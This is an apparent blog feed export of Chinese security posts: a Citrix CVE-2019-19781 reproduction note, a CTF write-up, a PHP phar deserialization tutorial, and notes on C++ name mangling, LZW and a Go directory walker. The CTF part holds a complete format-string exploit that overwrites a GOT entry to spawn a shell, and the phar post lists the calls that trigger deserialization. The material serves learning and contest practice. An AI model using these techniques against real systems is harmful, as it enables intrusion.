    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>下班刚到家，发现了某平台的漏洞提示，然后就趁热复现了一波</p></blockquote><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><blockquote><p>twitter上的一位大佬公布的poc</p></blockquote><p><img src="/images/pasted-205.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>NetScaler Gateway</p></blockquote><p><img src="/images/pasted-206.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>Citrix Gateway</p></blockquote><p><img src="/images/pasted-207.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>修复后的效果(官方修复建议:<a href="https://support.citrix.com/article/CTX267679" target="_blank" rel="noopener">https://support.citrix.com/article/CTX267679</a>)</p></blockquote><p><img src="/images/pasted-208.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><blockquote><p>利用的复杂度不是很大。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;下班刚到家，发现了某平台的漏洞提示，然后就趁热复现了一波&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;利用
      
    
    </summary>
    
      <category term="学习研究" scheme="https://bufsnake.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="CVE-2019-19781" scheme="https://bufsnake.github.io/tags/CVE-2019-19781/"/>
    
  </entry>
  
  <entry>
    <title>2019领航杯WP</title>
    <link href="https://bufsnake.github.io/2019%E9%A2%86%E8%88%AA%E6%9D%AFWP.html"/>
    <id>https://bufsnake.github.io/2019领航杯WP.html</id>
    <published>2019-12-13T18:25:17.000Z</published>
    <updated>2019-12-13T18:39:34.982Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-编码编码"><a href="#1-编码编码" class="headerlink" title="1.编码编码"></a>1.编码编码</h2><p>base64解码即可得到flag!</p><p><img src="/images/pasted-183.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:welcometothepilotcup</p><h2 id="2-取证分析"><a href="#2-取证分析" class="headerlink" title="2.取证分析"></a>2.取证分析</h2><p><img src="/images/pasted-184.png" srcset="/img/loading.gif" alt="upload successful"></p><p>利用脚本得到flag.png，用winhex删除开头多余数据，png文件头为89 50 开头</p><p><img src="/images/pasted-185.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结尾是AE 42 60 82</p><p>去除掉无用信息，得到flag，<strong>b91011fc</strong></p><h2 id="3-stegano-l"><a href="#3-stegano-l" class="headerlink" title="3.stegano l"></a>3.stegano l</h2><p>打开查看源码，得到flag就是passwd：后面字符 steganoI</p><p><img src="/images/pasted-186.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:steganol</p><h2 id="4-stegano"><a href="#4-stegano" class="headerlink" title="4.stegano"></a>4.stegano</h2><p>binwalk查看文件</p><p><img src="/images/pasted-187.png" srcset="/img/loading.gif" alt="upload successful"></p><p>foremost分离文件</p><p><img src="/images/pasted-188.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到flag</p><p><img src="/images/pasted-189.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:EORDFFOMFPMA</p><h2 id="5-lsb"><a href="#5-lsb" class="headerlink" title="5.lsb"></a>5.lsb</h2><p>用StegSolve打开图片，调制Red pane 3 即可得到flag</p><p><img src="/images/pasted-190.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:ONPGRAMBCICM</p><h2 id="6-恢复与解密"><a href="#6-恢复与解密" class="headerlink" title="6.恢复与解密"></a>6.恢复与解密</h2><p>下载附件,将其中的xty.img使用Diskgenius打开.</p><p>选择恢复文件</p><p><img src="/images/pasted-191.png" srcset="/img/loading.gif" alt="upload successful"></p><p>打开其中的INode00000010,可以看到密文 aWdxNDs3NDFSOzFpa1I1MWliT08waWdx</p><p>使用脚本对密文进行解密</p><pre><code class="python">import stringfrom base64 import *b=b64decode(&quot;aWdxNDs3NDFSOzFpa1I1MWliT08waWdx&quot;)data=list(b)for k in range(0,200):    key=&quot;&quot;    for i in range(len(data)):        key+=chr(ord(data[i])^k)    print (key)</code></pre><p>结果中没有特殊符号的则是flag</p><p>flag:jdr78472Q82jhQ62jaLL3jdr</p><h2 id="7-文件提取"><a href="#7-文件提取" class="headerlink" title="7.文件提取"></a>7.文件提取</h2><p>下载附件,使用记事本打开flag.exe.将其中的base64编码转换成图片</p><p><img src="/images/pasted-192.png" srcset="/img/loading.gif" alt="upload successful"></p><p>用记事本打开图片,可以在图片的最后看到flag</p><p>flag{068EEF6A7BAD3FDF}</p><h2 id="8-凯撒1"><a href="#8-凯撒1" class="headerlink" title="8.凯撒1"></a>8.凯撒1</h2><p>使用凯撒密码转换密文.</p><p><img src="/images/pasted-193.png" srcset="/img/loading.gif" alt="upload successful"></p><p>最后一个单词是flag</p><p>flag:moconlfpeold</p><h2 id="9-凯撒2"><a href="#9-凯撒2" class="headerlink" title="9.凯撒2"></a>9.凯撒2</h2><p>payload:</p><pre><code class="python">a = &quot;0B 33 33 28 20 2E 33 26 70 20 3D 33 39 20 37 33 30 3A 29 28 20 33 32 29 20 31 33 36 29 20 27 2C 25 30 30 29 32 2B 29 20 2D 32 20 3D 33 39 36 20 2E 33 39 36 32 29 3D 72 20 18 2C 2D 37 20 33 32 29 20 3B 25 37 20 2A 25 2D 36 30 3D 20 29 25 37 3D 20 38 33 20 27 36 25 27 2F 72 20 1B 25 37 32 6B 38 20 2D 38 03 20 75 76 7C 20 2F 29 3D 37 20 2D 37 20 25 20 35 39 2D 38 29 20 37 31 25 30 30 20 2F 29 3D 37 34 25 27 29 70 20 37 33 20 2D 38 20 37 2C 33 39 30 28 32 6B 38 20 2C 25 3A 29 20 38 25 2F 29 32 20 3D 33 39 20 38 33 33 20 30 33 32 2B 20 38 33 20 28 29 27 36 3D 34 38 20 38 2C 2D 37 20 31 29 37 37 25 2B 29 72 20 1B 29 30 30 20 28 33 32 29 70 20 3D 33 39 36 20 37 33 30 39 38 2D 33 32 20 2D 37 20 31 25 37 37 32 34 2A 33 25 37 26 37 72&quot;ls = []for i in a.split(&#39; &#39;):    ls.append(int(i, 16))print(ls)for i in range(-100, 100):    try:        for j in ls:            print(chr(j+i), end=&#39;&#39;)        print()    except:        pass</code></pre><p>得到flag如图中阴影</p><p><img src="/images/pasted-194.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="10-ascii"><a href="#10-ascii" class="headerlink" title="10.ascii"></a>10.ascii</h2><pre><code class="c">&gt;&gt;&gt; l=[84,104,101,32,115,111,108,117,116,105,111,110,32,105,115,58,32,105,104,98,100,115,105,101,111, 112,100,99,110]&gt;&gt;&gt; a=&#39;&#39;&gt;&gt;&gt; for i in l:...  a+=chr(i)...&gt;&gt;&gt; a&#39;The solution is: ihbdsieopdcn&#39;</code></pre><p>flag:ihbdsieopdcn</p><h2 id="11-forensics"><a href="#11-forensics" class="headerlink" title="11.forensics"></a>11.forensics</h2><p>binwalk查看文件</p><p><img src="/images/pasted-195.png" srcset="/img/loading.gif" alt="upload successful"></p><p>foremost分离文件</p><p>查看有用信息得到图片就是flag</p><p><img src="/images/pasted-196.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:360HA360</p><h2 id="12-usb"><a href="#12-usb" class="headerlink" title="12.usb"></a>12.usb</h2><p>发现是usb协议的流量分析然后找到了罗技</p><p><img src="/images/pasted-197.png" srcset="/img/loading.gif" alt="upload successful"></p><p>然后我们查看数据发现代表着鼠标的移动，导出数据到a.txt</p><pre><code class="c">00: ff :00:0000: ff :00:0000: ff :00:0000: fd: 00: 0000: ff :00:0000: ff :00:0000: fe: ff :0000: fd: 00:0000: fb:00: 0000: fc :00:0000: fb:00:0000: fc :00:0000: fc: ff :0000: fe: 00: 0000:fe:ff:0000: fe:00:0000: ff :00: 0000: fe:ff :0000: ff: ff :0001 :00: 00:00</code></pre><p>然后我们转换坐标</p><p>awk -F: ‘function comp(v){if(v&gt;127)v-=256;return v}{x+=comp(strtonum(“0x”$2));y+=comp(strtonum(“0x”$3))}$1==”01”{print x,y}’ a.txt &gt; b.txt</p><p>得到坐标后用gnuplot画出flag即可</p><p>flag为tHe_CAT_is_the_CULpRiT</p><h2 id="14-MasterofZip-Middle"><a href="#14-MasterofZip-Middle" class="headerlink" title="14.MasterofZip-Middle"></a>14.MasterofZip-Middle</h2><p>爆破得到password!</p><p><img src="/images/pasted-198.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到伪加密的包用winhex修改为00</p><p>得到flag.png用winhex审计后发现高度不够</p><p>我们调整高度后最终得到flag</p><p><img src="/images/pasted-199.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag{b2599e17dd7c48ae62d008a1a145cc6d9928d4ac}</p><h2 id="15-数据包分析-Easy"><a href="#15-数据包分析-Easy" class="headerlink" title="15.数据包分析-Easy"></a>15.数据包分析-Easy</h2><p>导出HTTP所有文件</p><p><img src="/images/pasted-200.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到flag.php，即flag</p><p>flag{3eyufhnj87}</p><h2 id="16-easyelf"><a href="#16-easyelf" class="headerlink" title="16.easyelf"></a>16.easyelf</h2><p>angr求解即可</p><p><img src="/images/pasted-201.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag{Thunk_c0des_xoR_thr3e_de4l}</p><h2 id="22-giao"><a href="#22-giao" class="headerlink" title="22.giao"></a>22.giao</h2><p>payload:</p><p><img src="/images/pasted-202.png" srcset="/img/loading.gif" alt="upload successful"></p><p>即可得到flag{5f284498df}</p><h2 id="23-easy-fmt"><a href="#23-easy-fmt" class="headerlink" title="23.easy_fmt"></a>23.easy_fmt</h2><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./easy_fmt&#39;)e = ELF(&#39;./easy_fmt&#39;)libc=ELF(&quot;/libc64.so&quot;)p=remote(&quot;39.104.173.175&quot;,&quot;15502&quot;)get_libc_payload = &quot;%7$s&quot;.ljust(8, &#39;a&#39;)+p64(e.got[&#39;read&#39;])p.send(get_libc_payload)read_libc = u64(p.recv(6)+&#39;\x00\x00&#39;)print hex(read_libc)begin_libc = read_libc-libc.symbols[&#39;read&#39;]print hex(begin_libc)one_gadget_libc = begin_libc+libc.symbols[&#39;system&#39;]print hex(one_gadget_libc)a1 = (one_gadget_libc &amp; 0xff0000) &gt;&gt; 16a2 = (one_gadget_libc &amp; 0xff00) &gt;&gt; 8a3 = one_gadget_libc &amp; 0xffprint hex(a1)+hex(a2)+hex(a3)point1 = [2, a1]point2 = [1, a2]point3 = [0, a3]def swap(p1, p2):    for i in range(2):        t = p1[i]        p1[i] = p2[i]        p2[i] = tif a1 &gt; a2:    swap(point1, point2)if a1 &gt; a3:    swap(point1, point3)if a2 &gt; a3:    swap(point2, point3)print point1+point2+point3point2[1] = point2[1]-point1[1]point3[1] = point3[1]-point2[1]-point1[1]print point1+point2+point3write_got_payload = &#39;%&#39;+str(point1[1])+&#39;c&#39;+&#39;%12$hhn&#39;write_got_payload += &#39;%&#39;+str(point2[1])+&#39;c&#39;+&#39;%13$hhn&#39;write_got_payload += &#39;%&#39;+str(point3[1])+&#39;c&#39;+&#39;%14$hhn&#39;write_got_payload = write_got_payload.ljust(48, &#39;a&#39;)write_got_payload += p64(e.got[&#39;printf&#39;]+point1[0])write_got_payload += p64(e.got[&#39;printf&#39;]+point2[0])write_got_payload += p64(e.got[&#39;printf&#39;]+point3[0])p.send(write_got_payload)sleep(1)p.sendline(&quot;/bin/sh\x00&quot;)p.interactive()</code></pre><p>得到flag{279920429c}</p><h2 id="24-EasyRE"><a href="#24-EasyRE" class="headerlink" title="24.EasyRE"></a>24.EasyRE</h2><p><img src="/images/pasted-203.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag{Let_Us_st4rt_R3v3rSe}</p><h2 id="25-EASYReverse"><a href="#25-EASYReverse" class="headerlink" title="25.EASYReverse"></a>25.EASYReverse</h2><p>ida查看程序，发现是个没有查表的base64，遂用脚本分离出了前一部分</p><p><img src="/images/pasted-204.png" srcset="/img/loading.gif" alt="upload successful"></p><p>最后三个字节手动拼凑得到正确flag</p><p>flag{JSe3psfxa2X96USgM58346t4Ta87uRQy}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-编码编码&quot;&gt;&lt;a href=&quot;#1-编码编码&quot; class=&quot;headerlink&quot; title=&quot;1.编码编码&quot;&gt;&lt;/a&gt;1.编码编码&lt;/h2&gt;&lt;p&gt;base64解码即可得到flag!&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-183.
      
    
    </summary>
    
      <category term="CTF" scheme="https://bufsnake.github.io/categories/CTF/"/>
    
    
      <category term="wp" scheme="https://bufsnake.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>phar反序列化</title>
    <link href="https://bufsnake.github.io/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"/>
    <id>https://bufsnake.github.io/phar反序列化.html</id>
    <published>2019-12-13T01:50:20.000Z</published>
    <updated>2019-12-13T01:59:26.878Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞作用"><a href="#漏洞作用" class="headerlink" title="漏洞作用"></a>漏洞作用</h2><p><code>在不使用unserialize()函数的情况下触发PHP反序列化漏洞</code></p><h2 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h2><p><code>使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Meta data 信息会被反序列化 如果要生成phar文件，要在php.ini中把phar只读给关闭</code></p><pre><code class="c">php.ini[Phar]phar.readonly = Off</code></pre><h2 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h2><pre><code class="c">&lt;?php$phar = new Phar(&#39;test.phar&#39;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); // add object of any class as meta dataclass AnyClass {}$object = new AnyClass;$object-&gt;data = &#39;rips&#39;;$phar-&gt;setMetadata($object);$phar-&gt;stopBuffering();</code></pre><pre><code class="c">php -c /Applications/XAMPP/xamppfiles/etc/php.ini phar.php //执行生成的文件如下</code></pre><p><img src="/images/pasted-181.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">&lt;?php// add object of any class as meta dataclass AnyClass {    function __destruct(){        echo $this-&gt;data;    }    function __sleep(){        echo &#39;sleep&#39;;    }   function __wakeup(){       echo &#39;wakeup&lt;br&gt;&#39;;   }}include(&#39;phar://test.phar&#39;); // 触发反序列化</code></pre><p><img src="/images/pasted-182.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="能够触发反序列化的函数有"><a href="#能够触发反序列化的函数有" class="headerlink" title="能够触发反序列化的函数有"></a>能够触发反序列化的函数有</h2><pre><code class="c">include(&#39;phar://test.phar&#39;);var_dump(file(&#39;phar://test.phar&#39;));var_dump(fopen(&#39;phar://test.phar&#39;,&#39;r&#39;));var_dump(file_get_contents(&#39;phar://test.phar&#39;));var_dump(file_get_contents(&#39;phar://test.jpg&#39;));(把文件名改成jpg也有效)var_dump(file_exists(&#39;phar://test.phar&#39;));file_exists($_GET[&#39;file&#39;]);md5_file($_GET[&#39;file&#39;]);filemtime($_GET[&#39;file&#39;]);filesize($_GET[&#39;file&#39;]);</code></pre><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><p><a href="https://mp.weixin.qq.com/s/TNAdeBNBErYjtTGGfentFg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/TNAdeBNBErYjtTGGfentFg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞作用&quot;&gt;&lt;a href=&quot;#漏洞作用&quot; class=&quot;headerlink&quot; title=&quot;漏洞作用&quot;&gt;&lt;/a&gt;漏洞作用&lt;/h2&gt;&lt;p&gt;&lt;code&gt;在不使用unserialize()函数的情况下触发PHP反序列化漏洞&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;触发
      
    
    </summary>
    
      <category term="学习研究" scheme="https://bufsnake.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="phar反序列化" scheme="https://bufsnake.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>C++ 符号修饰和函数签名</title>
    <link href="https://bufsnake.github.io/C-%E7%AC%A6%E5%8F%B7%E4%BF%AE%E9%A5%B0%E5%92%8C%E5%87%BD%E6%95%B0%E7%AD%BE%E5%90%8D.html"/>
    <id>https://bufsnake.github.io/C-符号修饰和函数签名.html</id>
    <published>2019-11-19T10:16:23.000Z</published>
    <updated>2019-11-25T09:43:42.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>在开始的时候，源文件与目标文件的函数的符号名是相同的。后来UNIX平台和C语言发明时，已经存在很多汇编编写的库和目标文件，一个C程序要使用他们，就不能定义这些库中定义的函数和变量的名字作为符号，否则会产生冲突。为了防止类似的符号名冲突，UNIX下的C语言就规定，C语言源代码文件中的所有全局的变量和函数经过编译以后，相对应的符号名前加上下划线”<em>“。而Fortran语言的源代码经过编译以后，所有的符号名前加上”</em>“，后面也加上”_”。比如一个C语言函数”foo”，那么它编译后的符号名就是”_foo”；如果是Fortran语言，就是”<em>foo</em>“。 这种方法能够暂时减少多种语言目标文件之间的符号冲突的概率，但还是没有从根本上解决符号冲突的问题。比如同一种语言编写的目标文件还有可能会产生符号冲突，于是像C++这样的后来设计的语言开始考虑到了这个问题，增加了名称空间（Namespace）的方法来解决多模块的符号冲突问题。 在现在的Linux下的GCC编译器中，默认情况下已经去掉了在C语言符号前加”<em>“的这种方式；但是Windows平台下的编译器还保持的这样的传统，比如Visual C++编译器就会在C语言符号前加”</em>“，GCC在Windows平台下的版本（cygwin、mingw）也会加”_”。GCC编译器也可以通过参数选项”-fleading-underscore”或”-fno-leading-underscore”来打开和关闭是否在C语言符号前加上下划线。</p></blockquote><h2 id="符号修饰"><a href="#符号修饰" class="headerlink" title="符号修饰"></a>符号修饰</h2><pre><code class="c">int func(int);  float func(float);  class C {      int func(int);      class C2 {          int func(int);      };  };  namespace N {      int func(int);      class C {          int func(int);      };  } </code></pre><p><code>上面的6个函数签名在GCC编译器下，相对应的修饰后名称如下所示：</code></p><pre><code class="c">函数签名                       符号名int func(int)                  _Z4funcifloat func(float)              _Z4funcfint C::func(int)               _ZN1C4funcEiint C::C2::func(int)           _ZN1C2C24funcEiint N::func(int)               _ZN1N4funcEiint N::C::func(int)            _ZN1N1C4funcEi</code></pre><p><code>GCC的基本C++名称修饰方法如下</code></p><blockquote><p>所有的符号都以”_Z”开头，对于嵌套的名字（在名称空间或在类里面的），后面紧跟”N”，然后是各个名称空间和类的名字，每个名字前是名字字符串长度，再以”E”结尾。</p></blockquote><blockquote><p>比如N::C::func经过名称修饰以后就是_ZN1N1C4funcE。</p></blockquote><blockquote><p>对于一个函数来说，它的参数列表紧跟在”E”后面，对于int类型来说，就是字母”i”。</p></blockquote><blockquote><p>所以整个N::C::func(int)函数签名经过修饰为_ZN1N1C4funcEi。</p></blockquote><p><code>C++中的全局变量和静态变量也有同样的机制</code></p><blockquote><p>对于全局变量来说，它跟函数一样都是一个全局可见的名称，它也遵循上面的名称修饰机制，比如一个名称空间foo中的全局变量bar，它修饰后的名字为：_ZN3foo3barE。</p></blockquote><blockquote><p>变量的类型并没有被加入到修饰后名称中，所以不论这个变量是整形还是浮点型甚至是一个全局对象，它的名称都是一样的。</p></blockquote><blockquote><p>名称修饰机制也被用来防止静态变量的名字冲突。</p></blockquote><blockquote><p>比如 main() 函数里面有一个静态变量叫foo，而 func() 函数里面也有一个静态变量叫foo。</p></blockquote><blockquote><p>为了区分这两个变量，GCC会将它们的符号名分别修饰成两个不同的名字”_ZZ4mainE3foo”和”_ZZ4funcE3foo”.</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在开始的时候，源文件与目标文件的函数的符号名是相同的。后来UNIX平台和C语言发明时，已经存在很多汇编编写的库和目
      
    
    </summary>
    
      <category term="C语言" scheme="https://bufsnake.github.io/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="C++符号修饰" scheme="https://bufsnake.github.io/tags/C-%E7%AC%A6%E5%8F%B7%E4%BF%AE%E9%A5%B0/"/>
    
  </entry>
  
  <entry>
    <title>LZW无损压缩算法</title>
    <link href="https://bufsnake.github.io/LZW%E6%97%A0%E6%8D%9F%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95.html"/>
    <id>https://bufsnake.github.io/LZW无损压缩算法.html</id>
    <published>2019-11-08T13:25:32.000Z</published>
    <updated>2019-11-25T09:42:53.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>在看writeup的时候，题目含有base64和lzw算法，由于不了解lzw算法，遂学习一下。</p></blockquote><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>LZW就是通过建立一个字符串表，用较短的代码来表示较长的字符串来实现压缩。</p></blockquote><hr><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><blockquote><p>从原字符串不断地读入新的字符，并试图将单个字符或字符串编码为记号 (Symbol)。</p></blockquote><blockquote><p>维护两个变量，一个是P (Previous)，表示手头已有的，还没有被编码的字符串，一个是C (current)，表示当前新读进来的字符。</p></blockquote><ol><li>初始状态，字典里只有所有的默认项，例如0-&gt;a，1-&gt;b，2-&gt;c。此时P和C都是空的。</li><li>读入新的字符C，与P合并形成字符串P+C。</li><li><p>在字典里查找P+C，如果:</p><ol><li><p>P+C在字典里，P=P+C。</p></li><li><p>P+C不在字典里，将P的记号输出；在字典中为P+C建立一个记号映射；更新P=C。</p></li></ol></li><li><p>返回步骤2重复，直至读完原字符串中所有字符。</p></li></ol><blockquote><p>以上表示的是编码中间的一般过程，在收尾的时候有一些特殊的处理，即步骤2中，如果到达字符串尾部，没有新的C读入了，则将手头的P对应的记号输出，结束。</p></blockquote><blockquote><p>编码过程的核心就在于第3步，需要理解P究竟是什么。P是当前维护的，可以被编码为记号的子串。注意P是可以被编码为记号，但还并未输出。新的字符C不断被读入并添加到P的尾部，只要P+C仍然能在字典里找到，就不断增长更新P=P+C，这样就能将一个尽可能长的字串P编码为一个记号，这就是压缩的实现。当新的P+C无法在字典里找到时，我们没有办法，输出已有的P的编码记号，并为新子串P+C建立字典表项。然后新的P从单字符C开始，重新增长，重复上述过程。</p></blockquote><pre><code class="c">用一个例子来说明编码的过程ababcababac初始状态字典里有三个默认的映射：Symbol    String0         a1         b2         c开始编码：Step   P   C   P+C   P+C in Dict ？      Action               Output1      -   a    a        Yes             更新P=a               -2      a   b    ab       No              添加3-&gt;ab，更新P=b     03      b   a    ba       No              添加4-&gt;ba，更新P=a     14      a   b    ab       Yes             更新P=ab              -5      ab  c    abc      No              添加5-&gt;abc，更新P=c    36      c   a    ca       No              添加6-&gt;ca，更新P=a     27      a   b    ab       Yes             更新P=ab              -8      ab  a    aba      No              添加7-&gt;aba，更新P=a    39      a   b    ab       Yes             更新P=ab              -10     ab  a    aba      Yes             更新P=aba             -11     aba c    abac     No              添加8-&gt;abac，更新P=c   712     c   -    -        -               -                     2注意编码过程中的第3-4步，第7-8步以及8-10步，子串P发生了增长，直到新的P+C无法在字典中找到，则将当前的P输出，P则更新为单字符C，重新开始增长。输出的结果为0132372，完整的字典为：Symbol String0      a1      b2      c3      ab4      ba5      abc6      ca7      aba8      abac原字符串对应到压缩后的编码的0 1 3  2 3  7   2a b ab c ab aba c</code></pre><hr><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><ol><li>初始状态，字典里只有所有的默认项，例如0-&gt;a，1-&gt;b，2-&gt;c。此时pW和cW都是空的。</li><li>读入第一个的符号cW，解码输出。注意第一个cW肯定是能直接解码的，而且一定是单个字符。</li><li>赋值pW=cW。</li><li>读入下一个符号cW。</li><li><p>在字典里查找cW，如果:</p><ol><li><p>cW在字典里：</p><ol><li>解码cW，即输出 Str(cW)。</li><li>令P=Str(pW)，C=Str(cW)的<strong>第一个字符</strong>。</li><li>在字典中为P+C添加新的记号映射。</li></ol></li><li><p>cW不在字典里:</p><ol><li>令P=Str(pW)，C=Str(pW)的<strong>第一个字符</strong>。</li><li>在字典中为P+C添加新的记号映射，这个新的记号一定就是cW。</li><li>输出P+C。</li></ol></li></ol></li><li>返回步骤3重复，直至读完所有记号。</li></ol><pre><code class="c">记号0 1 3  2 3  7   2解码a b ab c ab aba c初始状态字典里有三个默认的映射：Symbol    String0         a1         b2         cStep pW cW   cW in Dict ？   Action                             Output0    -  0       Yes          P=-,C=a,P+C=a                      a1    0  1       Yes          P=a，C=b，P+C=ab，添加3-&gt;ab          b2    1  3       Yes          P=b，C=a，P+C=ba，添加4-&gt;ba          ab3    3  2       Yes          P=ab，C=c，P+C=abc，添加5-&gt;abc       c4    2  3       Yes          P=c，C=a，P+C=ca，添加6-&gt;ca          ab5    3  7       No           P=ab，C=a，P+C=aba，添加7-&gt;aba       aba6    7  2       Yes          P=aba，C=c，P+C=abac，添加8-&gt;abac    c</code></pre><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><pre><code class="c">默认的映射表通常为255行，也就是ASCII码表的长度，拓展从256开始。加密：不断读取源数据，直到不在映射表里，输出P并添加一个新的映射解密：读取记号流，如果在映射表里，就输出并添加一个映射</code></pre><hr><h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p><a href="https://segmentfault.com/a/1190000011425787" target="_blank" rel="noopener">LZW压缩算法</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在看writeup的时候，题目含有base64和lzw算法，由于不了解lzw算法，遂学习一下。&lt;/p&gt;
&lt;/blo
      
    
    </summary>
    
      <category term="算法" scheme="https://bufsnake.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="LZW压缩算法" scheme="https://bufsnake.github.io/tags/LZW%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>目录遍历到递归</title>
    <link href="https://bufsnake.github.io/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%88%B0%E9%80%92%E5%BD%92.html"/>
    <id>https://bufsnake.github.io/目录遍历到递归.html</id>
    <published>2019-10-30T12:18:23.000Z</published>
    <updated>2019-11-25T09:42:53.148Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>半个月感觉没收获多少，主要学习了加密解密、编译原理、Windows内核相关基础教程、Golang的学习，并没有学完，一直在坚持和学校一样的教学体系，每天的课程是不一样的，不会导致学习疲劳，三分热度，一直抱着一本书看下去，几天就失了兴趣，比如编译原理…</p></blockquote><blockquote><p>一步一jo印</p></blockquote><h3 id="中序"><a href="#中序" class="headerlink" title="中序"></a>中序</h3><blockquote><p>之前学习Java时，没有想到写一个遍历指定目录的程序，最近在学习Golang，想着用GO语言实现以下。</p></blockquote><blockquote><p>思路</p></blockquote><ol><li>指定需要遍历的目录</li><li>列出目录下的所有文件以及文件夹</li><li>打印文件名或文件夹名</li><li>判断是否为文件夹，是则去第1步，否则去第5步</li><li>退出</li></ol><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><blockquote><p>用递归的方式实现该程序</p></blockquote><pre><code class="go">package mainimport (    &quot;fmt&quot;    &quot;io/ioutil&quot;)func main() {    listDir(&quot;/Users/bufsnake&quot;, 0)}func listDir(dir string, level int) {    s := &quot;&quot;    for i := 0; i &lt; level; i++ {        s = s + &quot;   &quot;    }    fileInfos, err := ioutil.ReadDir(dir)    if err != nil {        fmt.Println(err)    }    for _, file := range fileInfos {        fi := dir + &quot;/&quot; + file.Name()        fmt.Println(s + fi)        if file.IsDir() {            listDir(fi, level+1)        }    }}</code></pre><blockquote><p>运行结果</p></blockquote><pre><code class="bash">☁  golang  go run mulubianli.go/Users/bufsnake/golang/_   /Users/bufsnake/golang/_/main.go/Users/bufsnake/golang/array.go/Users/bufsnake/golang/bufio   /Users/bufsnake/golang/bufio/main.go/Users/bufsnake/golang/ch1   /Users/bufsnake/golang/ch1/dup1      /Users/bufsnake/golang/ch1/dup1/main.go   /Users/bufsnake/golang/ch1/dup2      /Users/bufsnake/golang/ch1/dup2/file      /Users/bufsnake/golang/ch1/dup2/main.go   /Users/bufsnake/golang/ch1/echo1      /Users/bufsnake/golang/ch1/echo1/main.go   /Users/bufsnake/golang/ch1/echo2      /Users/bufsnake/golang/ch1/echo2/main.go   /Users/bufsnake/golang/ch1/echo3      /Users/bufsnake/golang/ch1/echo3/main.go   